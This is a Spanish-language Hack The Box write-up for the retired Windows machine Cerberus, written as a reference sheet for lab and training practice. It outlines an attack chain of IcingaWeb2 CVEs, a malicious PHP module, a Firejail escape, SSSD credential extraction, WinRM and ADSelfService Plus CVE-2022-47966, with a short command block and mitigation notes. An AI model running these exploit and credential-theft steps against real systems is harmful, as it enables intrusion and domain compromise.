---
machine: Cerberus
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, icinga, firejail, sssd, adselfservice]
---

# Cerberus — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

IcingaWeb2 en una VM Linux es vulnerable a lectura y escritura de archivos (CVE-2022-24716 y CVE-2022-24715). Un módulo falso da ejecución; Firejail CVE-2022-31214 permite escapar, las credenciales de SSSD abren WinRM y ADSelfService Plus CVE-2022-47966 da SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443,5665,8080 <IP>
curl -s http://cerberus.htb/icingaweb2/
# CVE-2022-24716 lectura y CVE-2022-24715 escritura
python3 icinga_exploit.py http://cerberus.htb/icingaweb2 <IP> 4444
# Firejail
firejail --version
firejail --join=<PID>
# SSSD
getent passwd
ls -la /var/lib/sss/db/
# WinRM y ADSelfService
evil-winrm -i <HOST> -u <USER> -p '<PASS>'
python3 CVE-2022-47966.py --url https://<HOST> --lhost <IP>
```

## Enumeración

- IcingaWeb2 expuesto con módulos y plantillas.
- Firejail con una versión vulnerable dentro de la VM.
- SSSD con credenciales cacheadas y WinRM en el host Windows.

## Acceso inicial

Se usa la lectura arbitraria de IcingaWeb2 para leer configuración y la escritura para colocar un módulo PHP malicioso. Al cargarlo, se ejecuta código como el usuario del servicio web.

## Escalada de privilegios

Se explota Firejail para unirse al namespace de root dentro de la VM y se extraen credenciales de la base SSSD. Con esas credenciales se accede por WinRM; ADSelfService Plus es vulnerable a CVE-2022-47966 y permite ejecutar como SYSTEM.

## Evidencia

- Lectura de configuración de Icinga.
- Módulo malicioso cargado y shell en la VM.
- Credenciales SSSD, WinRM y shell SYSTEM.

## Lecciones aprendidas

- Un panel de monitorización con escritura de archivos es RCE.
- Firejail y SSSD amplían el movimiento lateral.
- Un producto con SAML mal validado puede costar el dominio.

## Mitigación y detección

- Actualizar IcingaWeb2, Firejail y ADSelfService Plus.
- Restringir módulos y escritura en el árbol web.
- Limitar WinRM y proteger la caché de SSSD.

## Referencias

- [0xdf — Cerberus](https://0xdf.gitlab.io/2023/07/29/htb-cerberus.html)
- [NVD — CVE-2022-24715](https://nvd.nist.gov/vuln/detail/CVE-2022-24715)
- [Hack The Box — Cerberus](https://app.hackthebox.com/machines/cerberus)
